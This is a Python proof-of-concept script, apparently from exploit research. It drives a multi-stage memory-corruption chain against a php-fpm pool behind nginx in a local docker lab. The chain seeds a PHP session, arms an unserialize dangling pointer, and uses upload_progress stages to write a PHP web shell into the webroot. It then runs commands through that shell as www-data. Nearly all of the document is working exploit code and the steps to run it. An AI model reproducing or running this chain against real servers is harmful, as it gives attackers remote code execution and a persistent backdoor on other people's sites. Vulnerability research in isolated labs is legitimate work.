#!/usr/bin/env python3
"""Fire the K-free SETTLED stage-fed ps_files->basedir file-write on a MULTI-WORKER
php-fpm pool (pm=static, max_children=6) behind nginx, with a PURE-HTTP session seat
shared across all stages (kfree_stagefed_forge.py + stage_session_seat.app_stage).

Multi-worker obstacle this closes: naively, all stage requests sharing ONE session id
looked unsafe -- each benign round-robin stage's upload_progress write touches that
file, so by the time the armed worker's stage lands it could decode a corrupted
(non-2-entry) session and self-deadlock. That failure mode is real, but it is caused
by `session.upload_progress.cleanup=off` (not PHP's default): with the default
`cleanup=on`, php_session_rfc1867_cleanup deletes the transient upload_progress key
after each benign request, restoring the original 2-entry session -- so ONE session,
seeded ONCE, survives benign multi-worker traffic indefinitely. No per-stage reseeding
needed; the app touchpoint count is 1 (one seed), not N (one per stage).

End-to-end, fresh-container-per-trial, black-box, loud:
  fresh 6-worker container (lab pool.conf: cleanup=on, PHP's real default)
  -> pure-HTTP seat, ONCE: GET /sess.php?a=9&b=2 with one chosen PHPSESSID
     (writes /tmp/sess_<sid> = "a|i:9;b|i:2;" -- key length/name doesn't matter
     to the forge, only "exactly two int entries, first >=2")
  -> pre-touch arm.php + echo.php round-robin (settle ALL workers)
  -> arm ONCE (approved unserialize OOM) -> dangle survives on exactly one worker
  -> stage POSTs round-robin, the SAME shared sid every time, until one hits the
     armed worker and forges the webroot write (benign hits on other workers are
     harmless: cleanup=on restores the 2-entry session after each one)
  -> GET /pub/pwned.php?0=<nonce cmd> -> capture output.

PASS = file written (black-box: GET fires the per-trial nonce AND uid=..(www-data))
AND every worker PID is unchanged (no worker crashed/respawned).

Pure HTTP: seat + arm + stages + fire are all HTTP. docker is used only for the
container lifecycle and (with --loud) a non-attack-path assertion that the seat
wrote exactly the 2-entry record.

--noseat: negative control (no seed -> empty session -> wrong forge geometry -> no
write, worker survives). The lab's cleanup=on is itself load-bearing for sharing one
session; see fpm-varpush-seat-consume-www memory for the cleanup=off negative control
(benign traffic permanently corrupts a shared session -> flock self-deadlock) -- not
re-tested here since this module's lab is fixed at cleanup=on.

Lab: profile fpmfiremw (6-worker fpmfire + the apsf sess.php seat endpoint):
    docker compose -f docker-compose.fpm-avenues.yml --profile fpmfiremw up -d --build
    # nginx 127.0.0.1:18101
Run:
    python3 -I poc/chains/verify_fpm_stagefed_fire_mw.py [ntrials] [--pretouch N]
                                                          [--stages M] [--loud] [--noseat]

Measured: 2/2 + 3/3 PASS (loud), one shared seed; --noseat negative control 0/2.
Independently re-verified.
"""
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write.kfree_stagefed_forge import (  # noqa: E402
    SETTLED_CONST, arm_parts, pretouch_parts, stage_parts)
from primitives.groom.stage_session_seat import app_stage  # noqa: E402
from common.multipart import multipart_tuple  # noqa: E402

REPO = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO, "docker-compose.fpm-avenues.yml")
PROFILE = "fpmfiremw"
BASE = "http://127.0.0.1:18101"
CONTAINER = "p2s-fpmfiremw-fpm"
WEBSHELL = b"<?php system($_GET[0]);?>"
TARGET = "/var/www/html/pub/pwned.php"
URLPATH = "/pub/pwned.php"
SEAT_PATH = "/sess.php"
BND = b"----l2"
SEAT_A, SEAT_B = 9, 2  # -> "a|i:9;b|i:2;" via lab/apsf/html/sess.php
SHARED_SID = "mwseat" + "0" * 26


def comp(*a, t=180):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO, capture_output=True, text=True, timeout=t)


def dx(*c, t=30):
    return subprocess.run(["docker", "exec", CONTAINER, *c],
                          capture_output=True, text=True, timeout=t).stdout


def http(path, data=None, ct=None, t=90, cookie=None):
    req = urllib.request.Request(BASE + path, data=data)
    if ct:
        req.add_header("Content-Type", ct)
    if cookie:
        req.add_header("Cookie", "PHPSESSID=" + cookie)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def pid_of(path="/probe.php"):
    s, b = http(path, t=8)
    m = re.search(rb"(\d+)\s*$", b or b"")
    return m.group(1).decode() if (s == 200 and m) else None


def ready():
    for _ in range(80):
        if pid_of():
            return True
        time.sleep(0.5)
    return False


def all_pids(n=14):
    return set(filter(None, (pid_of() for _ in range(n))))


def shell_fires(cmd):
    """Black-box: GET the webshell path with cmd in $_GET[0]; returns the response body
    (empty-ish 'File not found' until the forge writes the file)."""
    s, b = http(f"{URLPATH}?0={urllib.parse.quote(cmd)}", t=15)
    return (b or b"").decode("latin-1", "replace")


def host_port():
    return BASE.split("//", 1)[1].split(":")[0], int(BASE.rsplit(":", 1)[1])


def trial(i, npre, nstage, loud, seat=True):
    comp("down", t=90)
    if comp("up", "-d", "--build").returncode != 0 or not ready():
        return f"trial {i}: SKIP(boot)", False
    host, port = host_port()

    # 1) PURE-HTTP seat, ONCE: one GET writes a clean 2-entry session shared by every
    #    stage. --noseat is a negative control: no seed -> empty session -> the 2-push
    #    forge geometry is wrong -> no write (proves the seed is load-bearing).
    if seat:
        app_stage(host, port, SEAT_PATH, SHARED_SID, a=SEAT_A, b=SEAT_B, timeout=10)
    if loud and seat:
        # structural check, not byte-exact: key length/name doesn't matter to the
        # forge (confirmed: apsf's 1-char-key sess.php works identically to a
        # byte-exact 2-char-key one) -- only "exactly two int entries, first >=2".
        got = dx("sh", "-c", "cat /tmp/sess_%s 2>&1" % SHARED_SID).strip()
        m = re.fullmatch(r"\w+\|i:(\d+);\w+\|i:(\d+);", got)
        if not m or int(m.group(1)) < 2:
            return (f"trial {i}: FAIL-LOUD seed sess_{SHARED_SID}={got!r} (want exactly "
                    f"2 int entries, first >=2)"), False

    # 2) settle ALL workers: benign arm.php unserialize + echo.php touch, round-robin.
    pbody, ph = multipart_tuple(pretouch_parts(), BND)
    for _ in range(npre):
        http("/arm.php", data=pbody, ct=ph["Content-Type"])
        http("/echo.php")
    pids0 = all_pids()

    # 3) arm ONCE -> dangle survives on exactly one worker.
    abody, ah = multipart_tuple(arm_parts(), BND)
    http("/arm.php", data=abody, ct=ah["Content-Type"])

    # 4) stages round-robin, the SAME shared sid every time, until the write lands.
    #    cleanup=on (the lab's pool.conf) restores the 2-entry session after each
    #    benign hit, so sharing one sid across every stage is safe.
    #    IMPORTANT: NO plain HTTP request may touch a worker between the arm and the
    #    consuming stage -- a plain request's RINIT(basic) memsets BG(unserialize) and
    #    destroys the dangle (only a pre-RINIT upload_progress decode consumes it). So
    #    landing is detected out-of-band (docker-exec ls, a lab observation, not part of
    #    the exploit), exactly as the single-worker verify_fpm_stagefed_fire.py does; the
    #    authoritative success signal below is the black-box GET-fire.
    parts, _ = stage_parts(TARGET, WEBSHELL)
    sbody, sh = multipart_tuple(parts, BND)
    landed_at = None
    for s in range(1, nstage + 1):
        http("/echo.php", data=sbody, ct=sh["Content-Type"], cookie=SHARED_SID, t=12)
        ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
        if TARGET in ls and "No such" not in ls:
            landed_at = s
            break
    wrote = landed_at is not None

    # 5) authoritative black-box FIRE.
    nonce = "FIRE%08x" % int.from_bytes(os.urandom(4), "big")
    body = shell_fires("echo " + nonce + ";id")
    uid = re.search(r"uid=\d+\([^)]*\)", body)
    fired = (nonce in body) and bool(re.search(r"uid=\d+\(www-data\)", body))

    pids1 = all_pids()
    survived = bool(pids0) and pids0 == pids1
    ok = wrote and fired and survived
    return (f"trial {i}: workers={len(pids0)} wrote={wrote}@stage{landed_at} "
            f"fired={fired} survived={survived} uid='{uid.group(0) if uid else 'n/a'}' "
            f"-> {'PASS' if ok else 'FAIL'}"), ok


def main():
    n = next((int(a) for a in sys.argv[1:] if a.isdigit()), 3)
    npre = int(sys.argv[sys.argv.index("--pretouch") + 1]) if "--pretouch" in sys.argv else 24
    nstage = int(sys.argv[sys.argv.index("--stages") + 1]) if "--stages" in sys.argv else 18
    loud = "--loud" in sys.argv
    seat = "--noseat" not in sys.argv
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    print(f"# mw stage-fed fire, ONE shared pure-HTTP seat (cleanup=on); reps={n} "
          f"pretouch={npre} max_stages={nstage} d_choff=0x{SETTLED_CONST['d_choff']:x}"
          f"{' [loud]' if loud else ''}{' [NOSEAT control]' if not seat else ''}", flush=True)
    npass = 0
    for i in range(1, n + 1):
        line, ok = trial(i, npre, nstage, loud, seat=seat)
        print(line, flush=True)
        npass += ok
    comp("down", t=90)
    print(f"\n{'PASS' if npass == n else 'FAIL'}: {npass}/{n} multi-worker stage-fed "
          f"file-write + GET-fire (uid-in-hand), ONE shared pure-HTTP session seed", flush=True)


if __name__ == "__main__":
    main()
